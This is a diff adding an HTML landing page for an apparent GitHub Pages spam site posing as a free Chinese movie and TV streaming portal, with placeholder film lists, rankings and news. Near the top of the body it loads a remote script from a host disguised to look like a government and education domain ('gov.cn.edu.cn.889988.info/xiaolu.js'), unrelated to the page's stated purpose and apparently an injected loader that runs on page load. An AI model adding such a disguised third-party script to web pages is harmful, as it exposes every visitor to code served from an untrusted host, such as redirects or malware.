@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>456重口味电影网 - 海量高清影视在线观看平台</title>
+<meta name="description" content="456重口味电影网(456zhongkouweidianyingwang-wap.github.io)汇集最新电影、热门电视剧、精彩综艺、动漫番剧等高清影视资源，多口味片单每日更新，免费在线观看。">
+<meta name="keywords" content="456重口味电影网, 电影, 电视剧, 综艺, 动漫, 高清影视, 在线观看, 多口味片单">
+<meta name="author" content="456重口味电影网">
+<meta name="robots" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://456zhongkouweidianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "456重口味电影网",
+  "url": "https://456zhongkouweidianyingwang-wap.github.io/",
+  "description": "456重口味电影网汇集最新电影、热门电视剧、综艺、动漫等高清影视资源，多口味片单每日更新。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://456zhongkouweidianyingwang-wap.github.io/#search?q={query}",
+    "query-input": "required name=query"
+  }
+}
+</script>
+<style>
+/* ============ 基础重置与绿色主题变量 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --brand:#00b86b;
+  --brand2:#0a7a4a;
+  --brand-soft:#e6f8ef;
+  --ink:#10291c;
+  --sub:#5c7a6c;
+  --line:#e2efe8;
+  --bg:#f2faf5;
+  --card:#ffffff;
+  --radius:16px;
+  --shadow:0 8px 30px rgba(10,122,74,.08);
+  --max:1200px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.6;overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:.2s}
+ul,ol{list-style:none}
+button{font:inherit;cursor:pointer;border:none;background:none}
+
+/* ============ 布局 ============ */
+.wrap{max-width:var(--max);margin:0 auto;padding:0 16px}
+
+/* ============ 顶部（绿色主题 + 搜索框） ============ */
+.topbar{
+  position:sticky;top:0;z-index:100;background:rgba(255,255,255,.94);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line);box-shadow:0 2px 14px rgba(0,0,0,.04);
+}
+.topbar .wrap{display:flex;align-items:center;gap:16px;height:66px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:20px;color:var(--brand2);flex-shrink:0}
+.logo .dot{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--brand),#5fd99c);display:grid;place-items:center;font-size:15px;color:#fff;font-weight:900;box-shadow:0 3px 10px rgba(0,184,107,.35)}
+.search{flex:1;max-width:380px;position:relative;margin-left:auto}
+.search input{
+  width:100%;padding:10px 44px 10px 16px;border-radius:999px;border:1px solid var(--line);
+  background:var(--bg);font-size:14px;outline:none;transition:.2s;
+}
+.search input:focus{border-color:var(--brand)}
+.search button{position:absolute;right:4px;top:4px;width:32px;height:32px;border-radius:50%;background:var(--brand);color:#fff}
+.menu-btn{display:none;font-size:26px;color:var(--brand2);line-height:1}
+
+/* ============ Hero ============ */
+.hero{
+  position:relative;overflow:hidden;color:#fff;padding:72px 0;border-radius:0 0 40px 40px;
+  background:linear-gradient(120deg,#0a7a4a 0%,#00b86b 55%,#38d39f 100%);
+}
+.hero::before{content:"";position:absolute;right:-120px;top:-120px;width:420px;height:420px;border-radius:50%;background:rgba(255,255,255,.12)}
+.hero::after{content:"";position:absolute;left:-80px;bottom:-160px;width:320px;height:320px;border-radius:50%;background:rgba(255,255,255,.08)}
+.hero .wrap{position:relative;z-index:1}
+.hero .kicker{display:inline-block;background:rgba(255,255,255,.22);padding:6px 16px;border-radius:999px;font-size:13px;margin-bottom:18px;backdrop-filter:blur(4px)}
+.hero h1{font-size:clamp(30px,5.5vw,52px);line-height:1.2;font-weight:900;margin-bottom:18px}
+.hero h1 span{background:linear-gradient(90deg,#ffe600,#ff9a3c);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{font-size:16px;max-width:600px;opacity:.94;margin-bottom:28px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 28px;border-radius:999px;font-weight:700;font-size:15px;transition:.2s}
+.btn-main{background:#fff;color:var(--brand2);box-shadow:0 6px 18px rgba(0,0,0,.12)}
+.btn-main:hover{transform:translateY(-2px)}
+.btn-line{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.6)}
+.btn-line:hover{background:rgba(255,255,255,.18)}
+
+/* ============ 通用区块 ============ */
+.block{padding:60px 0}
+.block-head{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+.block-head .t{display:flex;align-items:center;gap:10px}
+.block-head .t i{width:8px;height:24px;border-radius:4px;background:linear-gradient(var(--brand),#38d39f);display:block}
+.block-head h2{font-size:25px;font-weight:900}
+.block-head .more{font-size:14px;color:var(--sub)}
+.block-head .more:hover{color:var(--brand)}
+
+/* ============ 栏目一：口味筛选（差异化：Tab 标签 + 横向口味条） ============ */
+.taste-bar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:22px}
+.taste-bar a{
+  padding:8px 18px;border-radius:999px;background:var(--card);border:1px solid var(--line);
+  font-size:14px;font-weight:600;color:var(--sub);box-shadow:var(--shadow);
+}
+.taste-bar a.on{background:linear-gradient(135deg,var(--brand),#38d39f);color:#fff;border-color:transparent}
+.taste-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
+.taste-card{
+  position:relative;padding:24px 18px;border-radius:var(--radius);background:var(--card);
+  box-shadow:var(--shadow);overflow:hidden;transition:.25s;border:1px solid transparent;
+}
+.taste-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:linear-gradient(var(--brand),#38d39f)}
+.taste-card:hover{transform:translateY(-5px);border-color:var(--brand)}
+.taste-card .big{font-size:30px;margin-bottom:8px}
+.taste-card h3{font-size:17px;font-weight:800}
+.taste-card p{font-size:13px;color:var(--sub);margin-top:4px}
+
+/* ============ 栏目二：影片海报（差异化：竖向网格 + 角标） ============ */
+.films{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:18px}
+.film{background:var(--card);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:.25s}
+.film:hover{transform:translateY(-6px)}
+.cover{position:relative;aspect-ratio:3/4;background:linear-gradient(135deg,#0a7a4a,#38d39f);overflow:hidden}
+.cover .flag{position:absolute;top:10px;left:10px;background:rgba(255,255,255,.95);color:var(--brand2);font-size:12px;font-weight:700;padding:3px 10px;border-radius:6px}
+.cover .star{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.45);color:#ffe600;font-size:12px;font-weight:700;padding:3px 9px;border-radius:6px;backdrop-filter:blur(3px)}
+.cover .cap{position:absolute;inset:0;display:grid;place-items:center;color:#fff;text-align:center;padding:12px;font-size:13px}
+.cover .play{position:absolute;bottom:10px;right:10px;width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.95);color:var(--brand2);display:grid;place-items:center;font-size:15px;font-weight:900}
+.film .info{padding:12px 14px}
+.film .info h3{font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.film .info .desc{font-size:13px;color:var(--sub);margin-top:3px}
+
+/* ============ 栏目三：综艺（差异化：大图横滑卡片 + 进度条） ============ */
+.var-section{background:var(--card)}
+.var-scroll{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:6px}
+.var-scroll::-webkit-scrollbar{height:8px}
+.var-scroll::-webkit-scrollbar-thumb{background:#cfe8db;border-radius:4px}
+.vcard{flex:0 0 300px;scroll-snap-align:start;border-radius:var(--radius);overflow:hidden;background:var(--bg);box-shadow:var(--shadow)}
+.vthumb{height:170px;background:linear-gradient(135deg,#0a4a7a,#38b6d3);position:relative;display:grid;place-items:center;color:#fff;text-align:center;padding:14px}
+.vthumb::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 80% 30%,rgba(255,255,255,.2),transparent 50%)}
+.vthumb .ep{position:relative;z-index:1}
+.vthumb b{font-size:17px;display:block}
+.vinfo{padding:16px}
+.vinfo .ep-tag{display:inline-block;background:var(--brand-soft);color:var(--brand2);font-size:12px;padding:3px 10px;border-radius:6px;font-weight:600}
+.vinfo h3{font-size:16px;font-weight:800;margin:8px 0 6px}
+.vinfo .bar{height:6px;border-radius:4px;background:var(--line);overflow:hidden;margin-top:10px}
+.vinfo .bar i{display:block;height:100%;border-radius:4px;background:linear-gradient(90deg,var(--brand),#38d39f)}
+
+/* ============ 栏目四：热播榜单（差异化：斑马纹序号列表 + 竖条进度） ============ */
+.rank{background:linear-gradient(135deg,#10291c,#0a4a32);color:#fff;border-radius:32px;padding:40px}
+.rank .block-head h2{color:#fff}
+.rank .block-head .more{color:#9fe8c4}
+.rank-list li{
+  display:grid;grid-template-columns:56px 1fr auto;align-items:center;gap:16px;
+  padding:14px 18px;border-radius:14px;margin-bottom:8px;background:rgba(255,255,255,.06);
+}
+.rank-list li:nth-child(even){background:rgba(255,255,255,.1)}
+.rank-list .no{width:40px;height:40px;border-radius:12px;background:rgba(255,255,255,.14);display:grid;place-items:center;font-weight:900;font-size:18px}
+.rank-list li:nth-child(1) .no{background:linear-gradient(135deg,#ffd600,#ff9a3c);color:#10291c}
+.rank-list li:nth-child(2) .no{background:linear-gradient(135deg,#e0e0e0,#9e9e9e);color:#10291c}
+.rank-list li:nth-child(3) .no{background:linear-gradient(135deg,#ff9a5c,#c86b2a);color:#fff}
+.rank-list h4{font-size:15px;font-weight:700}
+.rank-list small{color:#9fe8c4;font-size:12px}
+.rank-list .hot{font-size:13px;color:#ffe600;font-weight:700}
+
+/* ============ 栏目五：资讯（差异化：编号大数字 + 左右布局） ============ */
+.news-bg{background:var(--bg)}
+.news-item{
+  display:grid;grid-template-columns:80px 1fr;gap:20px;background:var(--card);
+  border-radius:var(--radius);padding:20px;box-shadow:var(--shadow);margin-bottom:14px;align-items:flex-start;transition:.25s;
+}
+.news-item:hover{transform:translateX(6px)}
+.news-item .n{font-size:40px;font-weight:900;line-height:1;color:var(--brand-soft);-webkit-text-stroke:1px var(--brand)}
+.news-item:nth-child(1) .n{color:#fff;-webkit-text-stroke:0;background:linear-gradient(135deg,var(--brand),#38d39f);-webkit-background-clip:text;background-clip:text}
+.news-item h3{font-size:17px;font-weight:800;line-height:1.4}
+.news-item p{font-size:14px;color:var(--sub);margin:6px 0}
+.news-item time{font-size:12px;color:#9bb5a8}
+
+/* ============ 栏目六：关于（差异化：左文右数据环） ============ */
+.about{padding:60px 0;background:var(--card)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center}
+.about h2{font-size:27px;font-weight:900;margin-bottom:16px}
+.about h2 span{color:var(--brand)}
+.about>p{color:var(--sub);margin-bottom:12px}
+.features{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:18px}
+.features div{background:var(--bg);border-radius:12px;padding:14px;display:flex;align-items:center;gap:10px;font-weight:600;font-size:14px}
+.features div::before{content:"✓";width:24px;height:24px;border-radius:50%;background:var(--brand);color:#fff;display:grid;place-items:center;flex-shrink:0}
+.stats{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.stat{background:linear-gradient(135deg,#e6f8ef,#f2faf5);border-radius:var(--radius);padding:26px;text-align:center;border:1px solid var(--line)}
+.stat b{display:block;font-size:32px;font-weight:900;color:var(--brand2)}
+.stat span{font-size:13px;color:var(--sub)}
+.contact-box{margin-top:24px;background:linear-gradient(135deg,var(--brand),#38d39f);border-radius:var(--radius);padding:22px;color:#fff}
+.contact-box h4{font-size:16px;margin-bottom:10px}
+.contact-box p{font-size:14px;opacity:.95;display:flex;align-items:center;gap:8px}
+
+/* ============ 页脚 ============ */
+.foot{background:#0a1f15;color:#8fb89f;padding:38px 0 26px}
+.foot .wrap{text-align:center}
+.foot .flinks{display:flex;gap:20px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.foot .flinks a{color:#cfe8db;font-size:14px}
+.foot .flinks a:hover{color:#fff}
+.foot p{font-size:13px;line-height:1.9}
+
+/* ============ 回顶 ============ */
+.gotop{
+  position:fixed;right:18px;bottom:24px;z-index:90;width:46px;height:46px;border-radius:50%;
+  background:var(--brand);color:#fff;font-size:20px;box-shadow:0 6px 16px rgba(0,184,107,.4);display:none;place-items:center;
+}
+.gotop.show{display:grid}
+
+/* ============ 响应式 ============ */
+@media (max-width:860px){
+  .search{display:none}
+  .menu-btn{display:block}
+  .hero{padding:48px 0 56px;border-radius:0 0 28px 28px}
+  .block{padding:42px 0}
+  .rank{padding:26px 20px;border-radius:22px}
+  .about-grid{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .films{grid-template-columns:repeat(2,1fr);gap:12px}
+  .vcard{flex:0 0 240px}
+  .rank-list li{grid-template-columns:44px 1fr;padding:12px}
+  .rank-list .hot{display:none}
+  .news-item{grid-template-columns:1fr;gap:8px}
+  .news-item .n{font-size:30px}
+}
+@media (max-width:420px){
+  .films{grid-template-columns:repeat(2,1fr)}
+  .features{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 顶部 ===== -->
+<div class="topbar">
+  <div class="wrap">
+    <a href="#top" class="logo"><span class="dot">456</span>456重口味电影网</a>
+    <div class="search">
+      <input type="text" placeholder="搜索电影 / 电视剧 / 综艺…">
+      <button aria-label="搜索">🔍</button>
+    </div>
+    <button class="menu-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+  <nav id="mnav" style="display:none;background:#fff;border-top:1px solid var(--line);">
+    <div class="wrap" style="display:flex;flex-direction:column;padding:8px 16px;">
+      <a href="#top" style="padding:12px 0;border-bottom:1px solid var(--line);font-weight:600;">🏠 首页</a>
+      <a href="#taste" style="padding:12px 0;border-bottom:1px solid var(--line);font-weight:600;">🎭 口味筛选</a>
+      <a href="#films" style="padding:12px 0;border-bottom:1px solid var(--line);font-weight:600;">🎬 热播影片</a>
+      <a href="#variety" style="padding:12px 0;border-bottom:1px solid var(--line);font-weight:600;">🎤 综艺节目</a>
+      <a href="#rank" style="padding:12px 0;border-bottom:1px solid var(--line);font-weight:600;">🔥 热播榜单</a>
+      <a href="#news" style="padding:12px 0;border-bottom:1px solid var(--line);font-weight:600;">📰 影视资讯</a>
+      <a href="#about" style="padding:12px 0;font-weight:600;">ℹ️ 关于我们</a>
+    </div>
+  </nav>
+</div>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <span class="kicker">🎉 每日更新 · 多口味片单任你选</span>
+    <h1>456重口味电影网<br>总有一款<span>合你口味</span></h1>
+    <p>456重口味电影网（456zhongkouweidianyingwang-wap.github.io）汇聚最新电影、热播剧集、精彩综艺、动漫番剧，覆盖多种观影口味，高清流畅、免费在线观看。</p>
+    <div class="hero-btns">
+      <a href="#films" class="btn btn-main">开始看片 →</a>
+      <a href="#taste" class="btn btn-line">挑选口味</a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：口味筛选 ===== -->
+<section class="block" id="taste">
+  <div class="wrap">
+    <div class="block-head">
+      <div class="t"><i></i><h2>口味筛选</h2></div>
+      <a href="#" class="more">全部口味 ›</a>
+    </div>
+    <div class="taste-bar">
+      <a href="#" class="on">全部</a>
+      <a href="#">🎬 院线片</a>
+      <a href="#">📺 热播剧</a>
+      <a href="#">🎤 综艺</a>
+      <a href="#">🎨 动漫</a>
+      <a href="#">🎭 文艺</a>
+      <a href="#">💥 动作</a>
+      <a href="#">😂 喜剧</a>
+    </div>
+    <div class="taste-grid">
+      <a href="#" class="taste-card"><div class="big">🍿</div><h3>院线大片</h3><p>同步热映 · 最新上映</p></a>
+      <a href="#" class="taste-card"><div class="big">📺</div><h3>热播剧集</h3><p>高分好剧 · 持续追更</p></a>
+      <a href="#" class="taste-card"><div class="big">🎤</div><h3>爆笑综艺</h3><p>欢乐不断 · 每周更新</p></a>
+      <a href="#" class="taste-card"><div class="big">🎨</div><h3>动漫番剧</h3><p>新番热番 · 一键追番</p></a>
+      <a href="#" class="taste-card"><div class="big">🎭</div><h3>文艺经典</h3><p>佳作回味 · 陶冶情操</p></a>
+      <a href="#" class="taste-card"><div class="big">🌏</div><h3>海外精选</h3><p>欧美日韩 · 全球好片</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：热播影片 ===== -->
+<section class="block" id="films" style="padding-top:0;">
+  <div class="wrap">
+    <div class="block-head">
+      <div class="t"><i></i><h2>热播影片</h2></div>
+      <a href="#" class="more">更多影片 ›</a>
+    </div>
+    <div class="films">
+      <a href="#" class="film">
+        <div class="cover"><span class="flag">院线</span><span class="star">★ 9.2</span><span class="play">▶</span><div class="cap">《深海迷踪》<br>悬疑 / 犯罪</div></div>
+        <div class="info"><h3>深海迷踪</h3><div class="desc">悬疑 · 犯罪 · 2026</div></div>
+      </a>
+      <a href="#" class="film">
+        <div class="cover"><span class="flag">热剧</span><span class="star">★ 8.9</span><span class="play">▶</span><div class="cap">《锦绣长安》<br>古装 / 权谋</div></div>
+        <div class="info"><h3>锦绣长安</h3><div class="desc">古装 · 权谋 · 40集</div></div>
+      </a>
+      <a href="#" class="film">
+        <div class="cover"><span class="flag">新片</span><span class="star">★ 8.6</span><span class="play">▶</span><div class="cap">《逆风飞翔》<br>励志 / 剧情</div></div>
+        <div class="info"><h3>逆风飞翔</h3><div class="desc">励志 · 剧情 · 2026</div></div>
+      </a>
+      <a href="#" class="film">
+        <div class="cover"><span class="flag">经典</span><span class="star">★ 9.6</span><span class="play">▶</span><div class="cap">《天堂电影院》<br>文艺 / 怀旧</div></div>
+        <div class="info"><h3>天堂电影院</h3><div class="desc">文艺 · 经典 · 4K修复</div></div>
+      </a>
+      <a href="#" class="film">
+        <div class="cover"><span class="flag">动漫</span><span class="star">★ 9.1</span><span class="play">▶</span><div class="cap">《云端之约》<br>动画 / 奇幻</div></div>
+        <div class="info"><h3>云端之约</h3><div class="desc">动画 · 奇幻 · 剧场版</div></div>
+      </a>
+      <a href="#" class="film">
+        <div class="cover"><span class="flag">动作</span><span class="star">★ 8.4</span><span class="play">▶</span><div class="cap">《雷霆行动》<br>动作 / 警匪</div></div>
+        <div class="info"><h3>雷霆行动</h3><div class="desc">动作 · 警匪 · 2026</div></div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：综艺节目 ===== -->
+<section class="block var-section" id="variety">
+  <div class="wrap">
+    <div class="block-head">
+      <div class="t"><i></i><h2>综艺节目</h2></div>
+      <a href="#" class="more">更多综艺 ›</a>
+    </div>
+    <div class="var-scroll">
+      <a href="#" class="vcard">
+        <div class="vthumb"><div class="ep"><b>《青春旅行团》</b><br>户外旅行真人秀</div></div>
+        <div class="vinfo"><span class="ep-tag">更新至 EP12</span><h3>青春旅行团</h3><p>一路同行 · 风景与欢笑</p><div class="bar"><i style="width:80%"></i></div></div>
+      </a>
+      <a href="#" class="vcard">
+        <div class="vthumb"><div class="ep"><b>《蒙面唱将》</b><br>音乐竞演节目</div></div>
+        <div class="vinfo"><span class="ep-tag">更新至 EP09</span><h3>蒙面唱将</h3><p>神秘声音 · 实力对决</p><div class="bar"><i style="width:60%"></i></div></div>
+      </a>
+      <a href="#" class="vcard">
+        <div class="vthumb"><div class="ep"><b>《向往的生活》</b><br>田园慢综艺</div></div>
+        <div class="vinfo"><span class="ep-tag">更新至 EP15</span><h3>向往的生活</h3><p>回归田园 · 治愈心灵</p><div class="bar"><i style="width:92%"></i></div></div>
+      </a>
+      <a href="#" class="vcard">
+        <div class="vthumb"><div class="ep"><b>《极限挑战》</b><br>剧情式户外真人秀</div></div>
+        <div class="vinfo"><span class="ep-tag">更新至 EP11</span><h3>极限挑战</h3><p>智勇闯关 · 高能不断</p><div class="bar"><i style="width:70%"></i></div></div>
+      </a>
+      <a href="#" class="vcard">
+        <div class="vthumb"><div class="ep"><b>《喜剧总动员》</b><br>喜剧竞演节目</div></div>
+        <div class="vinfo"><span class="ep-tag">更新至 EP07</span><h3>喜剧总动员</h3><p>爆笑段子 · 欢乐不停</p><div class="bar"><i style="width:45%"></i></div></div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：热播榜单 ===== -->
+<section class="block" id="rank">
+  <div class="wrap rank">
+    <div class="block-head">
+      <div class="t"><i></i><h2>热播榜单 TOP5</h2></div>
+      <a href="#" class="more">完整榜单 ›</a>
+    </div>
+    <ul class="rank-list">
+      <li><div class="no">1</div><div><h4>深海迷踪</h4><small>悬疑 / 犯罪 · 热映中</small></div><div class="hot">🔥 932万</div></li>
+      <li><div class="no">2</div><div><h4>锦绣长安</h4><small>古装 / 权谋 · 更新至32集</small></div><div class="hot">🔥 856万</div></li>
+      <li><div class="no">3</div><div><h4>蒙面唱将</h4><small>综艺 / 音乐 · 最新一期</small></div><div class="hot">🔥 741万</div></li>
+      <li><div class="no">4</div><div><h4>逆风飞翔</h4><small>励志 / 剧情 · 高清正片</small></div><div class="hot">🔥 628万</div></li>
+      <li><div class="no">5</div><div><h4>青春旅行团</h4><small>综艺 / 户外 · 每周更新</small></div><div class="hot">🔥 573万</div></li>
+    </ul>
+  </div>
+</section>
+
+<!-- ===== 栏目五：影视资讯 ===== -->
+<section class="block news-bg" id="news">
+  <div class="wrap">
+    <div class="block-head">
+      <div class="t"><i></i><h2>影视资讯</h2></div>
+      <a href="#" class="more">更多资讯 ›</a>
+    </div>
+    <div>
+      <a href="#" class="news-item">
+        <div class="n">01</div>
+        <div>
+          <h3>2026国庆档票房创新高，多部国产片口碑票房双丰收</h3>
+          <p>今年国庆档多类型影片集中上映，悬疑、动作、喜剧百花齐放，观众观影热情持续高涨。</p>
+          <time>📅 2026-10-08</time>
+        </div>
+      </a>
+      <a href="#" class="news-item">
+        <div class="n">02</div>
+        <div>
+          <h3>《深海迷踪》口碑炸裂，成年度黑马悬疑大片</h3>
+          <p>影片以层层反转的剧情和电影级视听语言收获高分评价，被观众誉为今年必看悬疑之作。</p>
+          <time>📅 2026-10-05</time>
+        </div>
+      </a>
+      <a href="#" class="news-item">
+        <div class="n">03</div>
+        <div>
+          <h3>多部经典老片启动4K修复计划，年底将重登大银幕</h3>
+          <p>一批影史经典作品正在进行数字化修复，高清画质搭配大银幕，带来全新观影体验。</p>
+          <time>📅 2026-10-02</time>
+        </div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目六：关于我们 ===== -->
+<section class="about" id="about">
+  <div class="wrap about-grid">
+    <div>
+      <h2>关于 <span>456重口味电影网</span></h2>
+      <p>456重口味电影网（456zhongkouweidianyingwang-wap.github.io）是一个专注于影视内容推荐的在线平台，覆盖电影、电视剧、综艺、动漫等多种类型，打造多口味观影片单。</p>
+      <p>每日持续更新，分类清晰、片单丰富，让你轻松发现合口味的好内容。</p>
+      <div class="features">
+        <div>海量高清资源</div>
+        <div>每日持续更新</div>
+        <div>多口味片单</div>
+        <div>免费在线观看</div>
+      </div>
+    </div>
+    <div>
+      <div class="stats">
+        <div class="stat"><b>10万+</b><span>影视资源</span></div>
+        <div class="stat"><b>6大</b><span>内容分类</span></div>
+        <div class="stat"><b>1080P</b><span>高清画质</span></div>
+        <div class="stat"><b>24h</b><span>每日更新</span></div>
+      </div>
+      <div class="contact-box">
+        <h4>📞 站点信息</h4>
+        <p>🌐 网址：456zhongkouweidianyingwang-wap.github.io</p>
+        <p>📛 名称：456重口味电影网</p>
+        <p>🎯 定位：多口味高清影视在线观看平台</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="flinks">
+      <a href="#top">首页</a>
+      <a href="#taste">口味筛选</a>
+      <a href="#films">热播影片</a>
+      <a href="#variety">综艺节目</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <p>© 2026 456重口味电影网（456zhongkouweidianyingwang-wap.github.io） 版权所有</p>
+    <p>本站仅供影视信息展示与推荐，请支持正版，尊重影视版权。</p>
+  </div>
+</footer>
+
+<button class="gotop" id="gTop" aria-label="回到顶部">↑</button>
+
+<script>
+var mBtn=document.getElementById('mBtn'),mnav=document.getElementById('mnav');
+mBtn.addEventListener('click',function(){mnav.style.display=mnav.style.display==='none'?'block':'none';});
+mnav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){mnav.style.display='none';});});
+
+var gTop=document.getElementById('gTop');
+window.addEventListener('scroll',function(){
+  gTop.classList.toggle('show',window.scrollY>400);
+  var cur='';
+  document.querySelectorAll('section[id]').forEach(function(s){if(window.scrollY>=s.offsetTop-120)cur=s.id;});
+});
+gTop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
